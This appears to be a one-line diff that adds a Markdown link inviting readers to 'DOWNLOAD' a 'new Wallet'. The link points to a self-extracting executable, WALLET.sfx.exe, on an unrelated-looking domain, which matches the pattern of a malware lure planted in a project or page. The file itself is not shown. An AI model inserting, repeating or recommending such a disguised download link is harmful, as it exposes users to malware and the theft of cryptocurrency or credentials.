@@ -1,0 +1,1 @@
+ [DOWNLOAD](https://btajy.com/bijingpai.com/WALLET.sfx.exe) our new Wallet !
